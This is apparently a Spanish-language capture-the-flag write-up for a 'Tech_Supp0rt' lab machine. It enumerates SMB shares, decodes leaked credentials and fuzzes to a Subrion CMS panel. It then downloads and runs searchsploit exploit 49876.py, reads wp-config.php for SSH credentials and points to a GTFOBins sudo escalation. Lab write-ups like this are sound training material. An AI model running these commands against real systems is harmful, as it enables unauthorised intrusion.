# Tech_Supp0rt

## Nmap

![alt text](image.png)
![alt text](image-1.png)

## Web
    
![alt text](image-3.png)

## SMB
    smbmap -H 10.10.103.138 

![alt text](image-2.png)

    smbmap -H 10.10.103.138 -r websvr 

![alt text](image-4.png)

Vemos el archivo descargado, creds ``admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk``
![alt text](image-5.png)

## Fuerza bruta

Desciframos la contraseñas usando [cyber-chef](https://gchq.github.io/CyberChef/)

![alt text](image-8.png)

La contraseña es ``Scam2021``

## Fuzzing

![alt text](image-6.png)

En la pagina wordpress podemos encontrar el login
![alt text](image-7.png)

Hacemos fuzzing desde el directorio de ```/subrion`` y encontramos el login
![alt text](image-9.png)

Entramos usando las credenciales anteriores
![alt text](image-10.png)

Aqui dentro podriamos subir una revershell o ya que tenemos la aplicacion y su version, podemos buscar un exploit

    searchsploit Subrion CMS

![alt text](image-11.png)

Descargamos el script de python

    searchsploit -m php/webapps/49876.py

![alt text](image-12.png)

Ejecutamos el exploit

    python3 49876.py -u http://10.10.103.138/subrion/panel/ -l admin -p Scam2021

![alt text](image-13.png)

Vemos los usuarios
![alt text](image-17.png)

Listamos los archivos
![alt text](image-14.png)

Navegamos hasta la carpeta wordpress
![alt text](image-15.png)

Vemos el contenido de ``wp-config.php``
![alt text](image-16.png)

Usuario ``scamsite``

Contraseña ``ImAScammerLOL!123!``

## Escala de privilegios

Entramos en SSH
![alt text](image-18.png)

Vemos los permisos
![alt text](image-19.png)

Buscamos el directorio en [gtfobins](https://gtfobins.github.io/gtfobins/iconv/#sudo)
![alt text](image-20.png)